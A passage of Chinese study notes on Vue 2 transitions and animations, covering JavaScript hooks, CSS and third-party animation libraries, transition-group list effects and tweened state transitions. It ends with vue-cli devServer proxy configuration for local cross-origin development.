  v-on:after-leave="afterLeave"
  v-on:leave-cancelled="leaveCancelled"
>
  <!-- ... -->
</transition>
```

```javascript
export default {
  methods: {
    beforeEnter: function (el) { },
    enter: function (el, done) { done() },
    afterEnter: function (el) { },
    enterCancelled: function (el) { },

    beforeLeave: function (el) { },
    leave: function (el, done) { done() },
    afterLeave: function (el) { },
    leaveCancelled: function (el) { }
  }
}
```

这些钩子函数可以结合 CSS `transitions/animations` 使用，也可以单独使用。

当只用 JavaScript 过渡的时候，**在 enter 和 leave 中，回调函数 done 是必须的** 。否则，它们会被同步调用，过渡会立即完成。

推荐对于仅使用 JavaScript 过渡的元素添加 `v-bind:css="false"`，Vue 会跳过 CSS 的检测。这也可以避免过渡过程中 CSS 的影响。

<a name="eb292ea2"></a>

### 四、CSS 动画

CSS 动画用法同 CSS 过渡，区别是在动画中 `v-enter` 类名在节点插入 DOM 后不会立即删除，而是在 `animationend` 事件触发时删除。

```vue
<template lang="pug">
div
  button(@click="show = !show") Toggle show
  transition(name="bounce")
    p(v-if="show") Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris facilisis enim libero, at lacinia diam fermentum id. Pellentesque habitant morbi tristique senectus et netus.
</template>

<script>
export default {
  data() {
    return {
      show: true
    }
  }
}
</script>

<style>
.bounce-enter-active {
  animation: bounce-in .5s;
}
.bounce-leave-active {
  animation: bounce-in .5s reverse;
}
@keyframes bounce-in {
  0% {
    transform: scale(0);
  }
  50% {
    transform: scale(1.5);
  }
  100% {
    transform: scale(1);
  }
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/eYdBEBw)

<a name="aef9y"></a>

### 五、与第三方 css 动画库结合

这对于 Vue 的过渡系统和其他第三方 CSS 动画库，如 [Animate.css](https://daneden.github.io/animate.css/) 结合使用十分有用。

示例：<br />首先在 `index.html` 的head中添加：

```vue
<link href="https://cdn.jsdelivr.net/npm/animate.css@3.5.1" rel="stylesheet" type="text/css">
```

在Vue组件中引入：

```vue
<template lang="pug">
div
  button(@click="show = !show") Toggle render
  transition(enter-active-class="animated bounce" leave-active-class="animated bounceOutRight")
    p(v-if="show") hello
</template>

<script>
export default {
  data() {
    return {
      show: true
    }
  }
}
</script>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/rNMWzyB)

<a name="EPHGA"></a>

### 六、与第三方 js 动画库结合

下面看一个使用 [Velocity.js](http://shouce.jb51.net/velocity/index.html) 的简单例子。

第一种方式是在 `index.html` 中引入：

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.3/velocity.min.js"></script>
```

然后在Vue组件中通过 `window.Velocity` 拿到 `Velocity` 对象：

```javascript
const Velocity = window.Velocity
```

第二种方式是直接在依赖中安装：

```bash
yarn add velocity-animate
```

然后在组件中引入：

```vue
<template lang="pug">
div
  button(@click="show = !show") Toggle
  transition(
    @before-enter="beforeEnter"
    @enter="enter"
    @leave="leave"
    :css="false"
  )
    p(v-if="show") Demo
</template>

<script>
const Velocity = window.Velocity
export default {
  data() {
    return {
      show: true
    }
  },
  methods: {
    beforeEnter (el) {
      el.style.opacity = 0
      el.style.transformOrigin = 'left'
    },
    enter (el, done) {
      Velocity(el, { opacity: 1, marginLeft: '2em', color: '#f00' }, { duration: 300 })
      Velocity(el, { opacity: 1, marginLeft: 0, fontSize: '1em', color: '#000' }, { complete: done })
    },
    leave (el, done) {
      Velocity(el, { translateX: '15px', rotateZ: '50deg' }, { duration: 600 })
      Velocity(el, { rotateZ: '100deg' }, { loop: 2 })
      Velocity(el, {
        rotateZ: '45deg',
        translateY: '30px',
        translateX: '30px',
        opacity: 0
      }, { complete: done })
    }
  }
}
</script>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/NWRbaKV)

<a name="ccd22449"></a>

### 七、初始渲染的过渡

可以通过 `appear` 特性设置节点在初始渲染的过渡。

```html
<transition appear>
  <!-- ... -->
</transition>
```

这里默认和进入/离开过渡一样，同样也可以自定义 CSS 类名。

```html
<transition
  appear
  appear-class="custom-appear-class"
  appear-to-class="custom-appear-to-class" (2.1.8+)
  appear-active-class="custom-appear-active-class"
>
  <!-- ... -->
</transition>
```

自定义 JavaScript 钩子：

```html
<transition
  appear
  v-on:before-appear="customBeforeAppearHook"
  v-on:appear="customAppearHook"
  v-on:after-appear="customAfterAppearHook"
  v-on:appear-cancelled="customAppearCancelledHook"
>
  <!-- ... -->
</transition>
```

使用 `animate.css` 的示例：

```vue
<template lang="pug">
div
  button(@click="show = !show") Toggle render
  transition(appear enter-active-class="animated bounce" leave-active-class="animated bounceOutRight")
    p(v-if="show") hello
</template>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/rNMWGmy)

参考：[https://vuejs.org/v2/guide/transitions.html#Transitions-on-Initial-Render](https://vuejs.org/v2/guide/transitions.html#Transitions-on-Initial-Render)

<a name="984b023a"></a>

### 八、过渡持续时间

在很多情况下，Vue 可以自动得出过渡效果的完成时机。默认情况下，Vue 会等待其在过渡效果的根元素的第一个 `transitionend` 或 `animationend` 事件。然而也可以不这样设定——比如，我们可以拥有一个精心编排的一序列过渡效果，其中一些嵌套的内部元素相比于过渡效果的根元素有延迟的或更长的过渡效果。

在这种情况下你可以用 `<transition>` 组件上的 `duration` 属性定制一个显性的过渡持续时间 (以毫秒计)：

```html
<transition :duration="1000">...</transition>
```

你也可以定制进入和移出的持续时间：

```html
<transition :duration="{ enter: 500, leave: 800 }">...</transition>
```

参考：[https://vuejs.org/v2/guide/transitions.html#Explicit-Transition-Durations](https://vuejs.org/v2/guide/transitions.html#Explicit-Transition-Durations)

<a name="9f55a8bb"></a>

### 九、多元素的过渡模式

首先看一个例子，将一个按钮的状态切换应用到元素过渡:

```vue
<template lang="pug">
transition(name="fade")
  button(v-bind:key="docState" @click="btnChange")
    | {{ buttonMessage }}
</template>

<script>
export default {
  data () {
    return {
      docState: 'edited'
    }
  },
  methods: {
    btnChange () {
      switch (this.docState) {
        case 'saved':
          this.docState = 'edited'
          break
        case 'edited':
          this.docState = 'editing'
          break
        case 'editing':
          this.docState = 'saved'
          break
      }
    }
  },
  computed: {
    buttonMessage() {
      switch (this.docState) {
        case 'saved': return 'Edit'
        case 'edited': return 'Save'
        case 'editing': return 'Cancel'
        default: return ''
      }
    }
  }
}
</script>

<style>
.fade-enter-active, .fade-leave-active {
  transition: opacity .5s;
}
.fade-enter, .fade-leave-to {
  opacity: 0;
}
</style=>
```

效果如下：<br />![GIF.gif](vue%E7%AC%94%E8%AE%B02.0.assets/1607670027722-73c39731-77ab-419e-af35-93edd7cc2d67.gif%23align=left&display=inline&height=35&originHeight=35&originWidth=229&size=10924&status=done&style=none&width=229)

可以看到，在切换按钮状态的时候，会出现两个动画: 上一个按钮 (状态改变之前的按钮) 的移除过渡 和 下一个按钮 (状态改变之后的按钮) 的进入过渡。但是，这有一个问题，由于两个过渡是同时执行的，会看到在上一个按钮未移除之前下一个按钮就已经出现，有一段时间是两个按钮共存的状态。

为了解决上述问题，引入了**过渡模式**的概念。

同时生效的进入和离开的过渡不能满足所有要求，所以 Vue 提供了 **过渡模式**

- `in-out`：新元素先进行过渡，完成之后当前元素过渡离开。
- `out-in`：当前元素先进行过渡，完成之后新元素过渡进入。

改进后的代码如下:

```vue
<template lang="pug">
transition(name="fade" mode="out-in")
  button(v-bind:key="docState" @click="btnChange")
    | {{ buttonMessage }}
</template>
```

效果如下：<br />![GIF.gif](vue%E7%AC%94%E8%AE%B02.0.assets/1607670092818-ab6069f6-bab8-4bd5-b892-77ebdcc9022b.gif%23align=left&display=inline&height=40&originHeight=40&originWidth=229&size=10399&status=done&style=none&width=229)

参考：[https://vuejs.org/v2/guide/transitions.html#Transitioning-Between-Elements](https://vuejs.org/v2/guide/transitions.html#Transitioning-Between-Elements)

<a name="42NFT"></a>

### 十、多组件过渡

多个组件的过渡简单很多 - 我们不需要使用 `key` 特性。我们只需要使用动态组件，配合着过渡模式：

```vue
<template lang="pug">
div
  input#A(type="radio" name="component" @change="view='v-a'")
  label(for="A") A
  input#B(type="radio" name="component" @change="view='v-b'")
  label(for="B") B
  transition(name="component-fade" mode="out-in")
    component(v-bind:is="view")
</template>

<script>
export default {
  data() {
    return {
      view: 'v-a'
    }
  },
  components: {
    'v-a': {
      template: '<div>Component A</div>'
    },
    'v-b': {
      template: '<div>Component B</div>'
    }
  }
}
</script>

<style>
.component-fade-enter-active, .component-fade-leave-active {
  transition: opacity .3s ease;
}
.component-fade-enter, .component-fade-leave-to {
  opacity: 0;
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/poENWGe)

参考：[https://vuejs.org/v2/guide/transitions.html#Transitioning-Between-Components](https://vuejs.org/v2/guide/transitions.html#Transitioning-Between-Components)

<a name="xqA1p"></a>

### 十一、**动态过渡**

在 Vue 中即使是过渡也是数据驱动的！动态过渡最基本的例子是通过 `name` 特性来绑定动态值。

当你想用 Vue 的过渡系统来定义的 CSS 过渡/动画 在不同过渡间切换会非常有用。

所有的过渡特性都是动态绑定。它不仅是简单的特性，通过事件的钩子函数方法，可以在获取到相应上下文数据。这意味着，可以根据组件的状态通过 JavaScript 过渡设置不同的过渡效果。

```vue
<template lang="pug">
div
  span Fade In:
  input(type="range" v-model="fadeInDuration" min="0" :max="maxFadeDuration")
  span Fade Out:
  input(type="range" v-model="fadeOutDuration" min="0" :max="maxFadeDuration")
  transition(
    :css="false"
    @before-enter="beforeEnter"
    @enter="enter"
    @leave="leave"
  )
    p(v-if="show") hello
  button(
    v-if="stop"
    @click="stop = false; show = false"
  ) Start animating
  button(v-else @click="stop = true") Stop it!
</template>

<script>
import Velocity from 'velocity-animate'
export default {
  data() {
    return {
      show: true,
      fadeInDuration: 1000,
      fadeOutDuration: 1000,
      maxFadeDuration: 1500,
      stop: true
    }
  },
  methods: {
    beforeEnter: function (el) {
      el.style.opacity = 0
    },
    enter: function (el, done) {
      var vm = this
      Velocity(el,
        { opacity: 1 },
        {
          duration: this.fadeInDuration,
          complete: function () {
            done()
            if (!vm.stop) vm.show = false
          }
        }
      )
    },
    leave: function (el, done) {
      var vm = this
      Velocity(el,
        { opacity: 0 },
        {
          duration: this.fadeOutDuration,
          complete: function () {
            done()
            vm.show = true
          }
        }
      )
    }
  }
}
</script>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/yLaVPPK)

参考：[https://vuejs.org/v2/guide/transitions.html#Dynamic-Transitions](https://vuejs.org/v2/guide/transitions.html#Dynamic-Transitions)

<a name="rFN5S"></a>

### 十二、过渡组件

过渡可以通过 Vue 的组件系统实现复用。要创建一个可复用过渡组件，你需要做的就是将 `<transition>` 或者 `<transition-group>` 作为根组件，然后将任何子组件放置在其中就可以了。

举例：<br />`TransitionComponent.vue` 

```vue
<template lang="pug">
transition(name="fade")
  slot
</template>

<script>
export default {
}
</script>

<style scoped>
.fade-enter-active, .fade-leave-active {
  transition: opacity .5s, margin-left 1s;
}
.fade-enter, .fade-leave-to {
  opacity: 0;
  margin-left: 20px;
}
.fade-enter-to, .fade-leave {
  opacity: 1;
  margin-left: 0;
}
</style>
```

引入过渡组件：

```vue
<template lang="pug">
div
  button(@click="show = !show") {{show ? '隐藏' : '显示'}}
  TransitionComponent
    p(v-if="show") hello
</template>

<script>
import TransitionComponent from './components/TransitionComponent'
export default {
  components: {
    TransitionComponent
  },
  data() {
    return {
      show: true
    }
  }
}
</script>
```

---

将其改写为函数式组件会更加合理：

```javascript
import Velocity from 'velocity-animate'

export default {
  functional: true,
  render: function (createElement, context) {
    var data = {
      props: {
        name: 'fade',
        mode: 'out-in'
      },
      on: {
        beforeEnter (el) {
          el.style.opacity = 0
          el.style.transformOrigin = 'left'
        },
        enter (el, done) {
          Velocity(el, { opacity: 1, marginLeft: '2em', color: '#f00' }, { duration: 300 })
          Velocity(el, { opacity: 1, marginLeft: 0, fontSize: '1em', color: '#000' }, { complete: done })
        },
        leave (el, done) {
          Velocity(el, { translateX: '15px', rotateZ: '50deg' }, { duration: 600 })
          Velocity(el, { rotateZ: '100deg' }, { loop: 2 })
          Velocity(el, {
            rotateZ: '45deg',
            translateY: '30px',
            translateX: '30px',
            opacity: 0
          }, { complete: done })
        }
      }
    }
    return createElement('transition', data, context.children)
  }
}
```

引入过渡组件：

```vue
<template lang="pug">
div
  button(@click="show = !show") {{show ? '隐藏' : '显示'}}
  TransitionComponent
    p(v-if="show") hello
</template>

<script>
import TransitionComponent from './components/TransitionComponent.js'
// import Velocity from 'velocity-animate'
export default {
  components: {
    TransitionComponent
  },
  data() {
    return {
      show: true
    }
  }
}
</script>
```

:::info
详细的项目参看：
:::
:::info
[https://codesandbox.io/s/transitioncomponent-yeqgc?file=/src/components/TransitionComponent.js](https://codesandbox.io/s/transitioncomponent-yeqgc?file=/src/components/TransitionComponent.js)
:::

参考：[https://vuejs.org/v2/guide/transitions.html#Reusable-Transitions](https://vuejs.org/v2/guide/transitions.html#Reusable-Transitions)

### 十三、列表过滤

在使用 `v-for` 的场景中，可以使用 `<transition-group>` 组件进行列表过渡。

- 不同于 `<transition>`，它会以一个真实元素呈现：默认为一个 `<span>`。可以通过 `tag` 特性更换为其他元素。
- 同 `<transition>`，需要指定 `name` 属性以添加过渡效果。
- 内部元素 **总是需要** 提供唯一的 `key` 属性值

<a name="4WMwW"></a>

#### transition-group

以下示例，展示了 `transition-group` 的基础用法：

```vue
<template lang="pug">
div
  button(v-on:click="add") Add
  button(v-on:click="remove") Remove
  transition-group(name="list" tag="p")
    span.list-item(v-for="item in items" :key="item") {{ item }}
</template>

<script>
export default {
  data() {
    return {
      items: [1,2,3,4,5,6,7,8,9],
      nextNum: 10
    }
  },
  methods: {
    randomIndex () {
      return Math.floor(Math.random() * this.items.length)
    },
    add () {
      this.items.splice(this.randomIndex(), 0, this.nextNum++)
    },
    remove () {
      this.items.splice(this.randomIndex(), 1)
    },
  }
}
</script>

<style scoped>
.list-item {
  display: inline-block;
  margin-right: 10px;
}
.list-enter-active, .list-leave-active {
  transition: all 1s;
}
.list-enter, .list-leave-to {
  opacity: 0;
  transform: translateY(30px);
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/BaLpvKZ)

<a name="OrL2N"></a>

#### v-move

`<transition-group>` 组件还有一个特殊之处。不仅可以进入和离开动画，还可以改变定位。要使用这个新功能只需了解新增的 **v-move 特性**，它会在元素的改变定位的过程中应用。像之前的类名一样，可以通过 `name` 属性来自定义前缀，也可以通过 `move-class` 属性手动设置。

`v-move` 对于设置过渡的切换时机和过渡曲线非常有用，只需在 name 指定的类名加上 move 后缀即可，下例结合 [lodash](https://www.lodashjs.com/) 使用。

```vue
<template lang="pug">
div
  button(@click="shuffle") Shuffle
  transition-group(name="flip-list" tag="ul")
    li(v-for="item in items" :key="item") {{ item }}
</template>

<script>
import _ from 'lodash'
export default {
  data() {
    return {
      items: [1,2,3,4,5,6,7,8,9]
    }
  },
  methods: {
    shuffle () {
      this.items = _.shuffle(this.items)
    }
  }
}
</script>

<style scoped>
.flip-list-move {
  transition: transform 1s;
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/gOwgZLm)<br />Vue 内部使用了一个叫 [FLIP](https://aerotwist.com/blog/flip-your-animations/) 简单的动画队列，使用 transforms 将元素从之前的位置平滑过渡新的位置。


需要注意的是使用 FLIP 过渡的元素不能设置为 `display: inline` 。作为替代方案，可以设置为 `display: inline-block` 或者放置于 flex 中


<a name="8t5mx"></a>

#### 更多示例

<a name="VMMJX"></a>

##### 列表常用方法

```vue
<template lang="pug">
div
  button(@click="shuffle") Shuffle
  button(@click="ascSort") AscSort
  button(@click="descSort") DescSort
  button(@click="add") Add
  button(@click="remove") Remove
  transition-group(name="list-complete" tag="p")
    span.list-complete-item(v-for="item in items" :key="item") {{ item }}
</template>

<script>
import _ from 'lodash'
export default {
  data() {
    return {
      items: [1,2,3,4,5,6,7,8,9],
      nextNum: 10
    }
  },
  methods: {
    randomIndex () {
      return Math.floor(Math.random() * this.items.length)
    },
    add () {
      this.items.splice(this.randomIndex(), 0, this.nextNum++)
    },
    remove () {
      this.items.splice(this.randomIndex(), 1)
    },
    shuffle () {
      this.items = _.shuffle(this.items)
    },
    ascSort () {
      this.items.sort((a, b) => a - b)
    },
    descSort () {
      this.items.sort((a, b) => b - a)
    }
  }
}
</script>

<style scoped>
.list-complete-item {
  transition: all 1s;
  display: inline-block;
  margin-right: 10px;
}
.list-complete-enter, .list-complete-leave-to {
  opacity: 0;
  transform: translateY(30px);
}
.list-complete-leave-active {
  position: absolute;
}
</style>
```

[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/XWjpoRQ)

<a name="7g4HR"></a>

##### 二维列表

```vue
<template lang="pug">
div
  button(@click="shuffle") Shuffle
  br
  transition-group.container(name="cell" tag="div")
    .cell(v-for="cell in cells" :key="cell.id") {{ cell.number }}
</template>

<script>
import _ from 'lodash'
export default {
  data() {
    return {
      cells: Array.apply(null, { length: 81 })
        .map(($, index) => {
          return {
            id: index,
            number: index % 9 + 1
          }
        })
    }
  },
  methods: {
    shuffle () {
      this.cells = _.shuffle(this.cells)
    }
  }
}
</script>

<style scoped>
.container {
  display: flex;
  flex-wrap: wrap;
  width: 238px;
  margin-top: 10px;
}
.cell {
  display: flex;
  justify-content: space-around;
  align-items: center;
  width: 25px;
  height: 25px;
  border: 1px solid #aaa;
  margin-right: -1px;
  margin-bottom: -1px;
}
.cell:nth-child(3n) {
  margin-right: 0;
}
.cell:nth-child(27n) {
  margin-bottom: 0;
}
.cell-move {
  transition: transform 1s;
}
</style>
```

[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/PoGWXOK)

<a name="ODxlT"></a>

##### 列表过滤

```vue
<template lang="pug">
div
  input(v-model="query")
  transition-group(
    name="staggered-fade" tag="ul" :css="false"
    @before-enter="beforeEnter"
    @enter="enter"
    @leave="leave"
  )
    li(v-for="(item, index) in computedList" :key="item.msg" :data-index="index") {{ item.msg }}
</template>

<script>
import Velocity from 'velocity-animate'
export default {
  data() {
    return {
      query: '',
      list: [
        { msg: 'Bruce Lee' },
        { msg: 'Jackie Chan' },
        { msg: 'Chuck Norris' },
        { msg: 'Jet Li' },
        { msg: 'Kung Fury' }
      ]
    }
  },
  computed: {
    computedList () {
      return this.list.filter((item) => {
        return item.msg.toLowerCase().indexOf(this.query.toLowerCase()) !== -1
      })
    }
  },
  methods: {
    beforeEnter (el) {
      el.style.opacity = 0
      el.style.height = 0
    },
    enter (el, done) {
      var delay = el.dataset.index * 150
      setTimeout(() => {
        Velocity(
          el,
          { opacity: 1, height: '1.6em' },
          { complete: done }
        )
      }, delay)
    },
    leave (el, done) {
      var delay = el.dataset.index * 150
      setTimeout(() => {
        Velocity(
          el,
          { opacity: 0, height: 0 },
          { complete: done }
        )
      }, delay)
    }
  }
}
</script>
```

以上，在 HTML 中定义了 data-index，在 js 中可以使用 el.dataset.index 取得。<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/mdrRajw)

### 十四、状态过滤

Vue 的过渡系统提供了非常多简单的方法设置进入、离开和列表的动效。那么对于数据元素本身的动效呢，比如：

- 数字和运算
- 颜色的显示
- SVG 节点的位置
- 元素的大小和其他的属性

所有的原始数字都被事先存储起来，可以直接转换到数字。做到这一步，我们就可以结合 Vue 的响应式和组件系统，使用第三方库来实现切换元素的过渡状态。

本文使用到的一些库：

- [gsap](https://www.npmjs.com/package/gsap)
- [color-js](https://www.npmjs.com/package/color-js)
- [tween.js](https://www.npmjs.com/package/tween.js)
- [@tweenjs/tween.js](https://www.npmjs.com/package/@tweenjs/tween.js)

<a name="fDCyA"></a>

#### 一、数字过渡

<a name="cQo19"></a>

##### 示例一：使用Tween

在 `index.html` 中引入Tween：

```vue
<script src="https://cdnjs.cloudflare.com/ajax/libs/tween.js/16.3.5/Tween.min.js"></script>
```

或者安装：

```bash
yarn add tween.js
```

以下示例，在修改数字的时候，会产生过渡效果。

```vue
<template lang="pug">
div
  input(v-model.number="number" type="number" step="20")
  p {{ animatedNumber }}
</template>

<script>
import TWEEN from 'tween.js'
export default {
  data() {
    return {
      number: 0,
      animatedNumber: 0
    }
  },
  watch: {
    number (newValue, oldValue) {
      var vm = this
      function animate () {
        if (TWEEN.update()) {
          requestAnimationFrame(animate)
        }
      }

      new TWEEN.Tween({ tweeningNumber: oldValue })
        .easing(TWEEN.Easing.Quadratic.Out)
        .to({ tweeningNumber: newValue }, 500)
        .onUpdate(function () {
          vm.animatedNumber = this.tweeningNumber.toFixed(0)
        })
        .start()

      animate()
    }
  }
}
</script>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/OJRWoBQ)

<a name="EC4OI"></a>

##### 示例二：使用GSAP

在 `index.html` 中引入：

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.5.1/gsap.min.js"></script>
```

或者安装：

```bash
yarn add gsap
```

以下示例，在修改数字的时候，会产生过渡效果。

```vue
<template lang="pug">
div
  input(v-model.number="number" type="number" step="20")
  p {{ animatedNumber }}
</template>

<script>
import gsap from 'gsap'
export default {
  data() {
    return {
      number: 0,
      tweenedNumber: 0
    }
  },
  computed: {
    animatedNumber: function() {
      return this.tweenedNumber.toFixed(0);
    }
  },
  watch: {
    number (newValue) {
      gsap.to(this.$data, { duration: 0.5, tweenedNumber: newValue });
    }
  }
}
</script>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/ExgZezV)

<a name="WW6tN"></a>

##### 示例三：数学计算

以下示例，在修改数字的时候，会产生过渡效果。

```vue
<template lang="pug">
div
  input(v-model.number="firstNumber" type="number" step="20")
  span +
  input(v-model.number="secondNumber" type="number" step="20")
  span = {{ result }}
  p
    animated-integer(:value="firstNumber")
    span +
    animated-integer(:value="secondNumber")
    span =
    animated-integer(:value="result")
</template>

<script>
import TWEEN from 'tween.js'
export default {
  components: {
    'animated-integer':  {
      template: '<span>{{ tweeningValue }}</span>',
      props: {
        value: {
          type: Number,
          required: true
        }
      },
      data () {
        return {
          tweeningValue: 0
        }
      },
      watch: {
        value (newValue, oldValue) {
          this.tween(oldValue, newValue)
        }
      },
      mounted () {
        this.tween(0, this.value)
      },
      methods: {
        tween (startValue, endValue) {
          let vm = this
          function animate () {
            if (TWEEN.update()) {
              requestAnimationFrame(animate)
            }
          }

          new TWEEN.Tween({ tweeningValue: startValue })
            .to({ tweeningValue: endValue }, 500)
            .onUpdate(function () {
              vm.tweeningValue = this.tweeningValue.toFixed(0)
            })
            .start()

          animate()
        }
      }
    }
  },
  data() {
    return {
      firstNumber: 20,
      secondNumber: 40
    }
  },
  computed: {
    result() {
      return this.firstNumber + this.secondNumber
    }
  }
}
</script>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/eYdgQqL)

<a name="adZFZ"></a>

#### **二、颜色过渡**

在 `index.html` 中引入Tween：

```vue
<script src="https://cdnjs.cloudflare.com/ajax/libs/tween.js/16.3.5/Tween.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/color-js/1.0.1/color.min.js"></script>
```

引入：

```javascript
const TWEEN = window.TWEEN
const Color = window.net.brehaut.Color
```

或者安装：

```bash
yarn add tween.js
yarn add color-js
```

以下示例，在修改颜色色值的时候，会产生过渡效果。

```vue
<template lang="pug">
div
  #box
    input(v-model="colorQuery" placeholder="Enter a color" @input="updateColor(null)")
    button(style="backgroundColor: red; color: white" @click="updateColor('#f00')") 红色
    button(style="backgroundColor: green; color: white" @click="updateColor('#0f0')") 绿色
    button(style="backgroundColor: blue; color: white" @click="updateColor('#00f')") 蓝色
  #box
    p Preview:
    div.preview(:style="{ backgroundColor: tweenedCSSColor }")
    p(:style="{ color: tweenedCSSColor }") {{ tweenedCSSColor }}
</template>

<script>
import TWEEN from 'tween.js'
import Color from 'color-js'

// const TWEEN = window.TWEEN
// const Color = window.net.brehaut.Color

export default {
  data() {
    return {
      colorQuery: '',
      color: {
        red: 0,
        green: 0,
        blue: 0,
        alpha: 1
      },
      tweenedColor: {}
    }
  },
  created: function () {
    this.tweenedColor = Object.assign({}, this.color)
  },
  watch: {
    color: function () {
      function animate () {
        if (TWEEN.update()) {
          requestAnimationFrame(animate)
        }
      }

      new TWEEN.Tween(this.tweenedColor)
        .to(this.color, 750)
        .start()

      animate()
    }
  },
  computed: {
    tweenedCSSColor: function () {
      return new Color({
        red: this.tweenedColor.red,
        green: this.tweenedColor.green,
        blue: this.tweenedColor.blue,
        alpha: this.tweenedColor.alpha
      }).toCSS()
    }
  },
  methods: {
    updateColor (color) {
      if (color) {
        this.colorQuery = color
      }
      this.color = new Color(this.colorQuery).toRGB()
    }
  }
}
</script>

<style scoped>
#box {
  display: flex;
  justify-content: flex-start;
  align-items: center;
}
.preview {
  width: 20px;
  height: 20px;
  margin-left: 10px;
  margin-right: 10px;
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/LYRxgEW)

<a name="S3Vve"></a>

#### **三、SVG过渡**

下面的示例依赖于 `TweenLite`，可以在 `index.html` 中引入：

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenLite.min.js"></script>
```

也可以从 `gsap` 中引入：

```javascript
import TweenLite from 'gsap'
```

完整的示例如下：

```vue
<template lang="pug">
div
  svg(width="200" height="200")
    polygon(:points="points")
    circle(cx="100" cy="100" r="90")
  div
    label Sides: {{ sides }}
    input(type="range" min="3" max="500" v-model.number="sides")
  div
    label Minimum Radius: {{ minRadius }}%
    input(type="range" min="0" max="90" v-model.number="minRadius")
  div
    label Update Interval: {{ updateInterval }} milliseconds
    input(type="range" min="10" max="2000" v-model.number="updateInterval")
</template>

<script>
import TweenLite from 'gsap'
export default {
  data: function () {
    var defaultSides = 10
    var stats = Array.apply(null, { length: defaultSides })
      .map(function () { return 100 })
    return {
      stats: stats,
      points: generatePoints(stats),
      sides: defaultSides,
      minRadius: 50,
      interval: null,
      updateInterval: 500
    }
  },
  watch: {
    sides: function (newSides, oldSides) {
      var sidesDifference = newSides - oldSides
      if (sidesDifference > 0) {
        for (var i = 1; i <= sidesDifference; i++) {
          this.stats.push(this.newRandomValue())
        }
      } else {
        var absoluteSidesDifference = Math.abs(sidesDifference)
        for (let i = 1; i <= absoluteSidesDifference; i++) {
          this.stats.shift()
        }
      }
    },
    stats: function (newStats) {
      TweenLite.to(
        this.$data,
        this.updateInterval / 1000,
        { points: generatePoints(newStats) }
      )
    },
    updateInterval: function () {
      this.resetInterval()
    }
  },
  mounted: function () {
    this.resetInterval()
  },
  methods: {
    randomizeStats: function () {
      var vm = this
      this.stats = this.stats.map(function () {
        return vm.newRandomValue()
      })
    },
    newRandomValue: function () {
      return Math.ceil(this.minRadius + Math.random() * (100 - this.minRadius))
    },
    resetInterval: function () {
      var vm = this
      clearInterval(this.interval)
      this.randomizeStats()
      this.interval = setInterval(function () {
        vm.randomizeStats()
      }, this.updateInterval)
    }
  }

}

function valueToPoint (value, index, total) {
  var x     = 0
  var y     = -value * 0.9
  var angle = Math.PI * 2 / total * index
  var cos   = Math.cos(angle)
  var sin   = Math.sin(angle)
  var tx    = x * cos - y * sin + 100
  var ty    = x * sin + y * cos + 100
  return { x: tx, y: ty }
}

function generatePoints (stats) {
  var total = stats.length
  return stats.map(function (stat, index) {
    var point = valueToPoint(stat, index, total)
    return point.x + ',' + point.y
  }).join(' ')
}
</script>

<style scoped>
#box {
  display: flex;
  justify-content: flex-start;
  align-items: center;
}
svg {
  display: block;
}
polygon {
  fill: #41b883;
}
circle {
  fill: transparent;
  stroke: #35495e;
}
input[type="range"] {
  display: block;
  width: 100%;
  margin-bottom: 15px;
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/XWjpxaj)

## vue脚手架配置代理

前端解决跨域的一种方式

### 方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

### 方法二(推荐)

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径  //代理服务器路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}   // 前缀,必须写
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

例子

vue.config.js 配置代理

```js
module.exports = {
  pages: {
    index: {
      //入口
      entry: 'src/main.js',
    },
  },
	lintOnSave:false, //关闭语法检查
	//开启代理服务器（方式一）
	/* devServer: {
    proxy: 'http://localhost:5000'
  }, */
	//开启代理服务器（方式二）
	devServer: {
    proxy: {
      '/atguigu': {
        target: 'http://localhost:5000',
				pathRewrite:{'^/atguigu':''},
        // ws: true, //用于支持websocket
        // changeOrigin: true //用于控制请求头中的host值
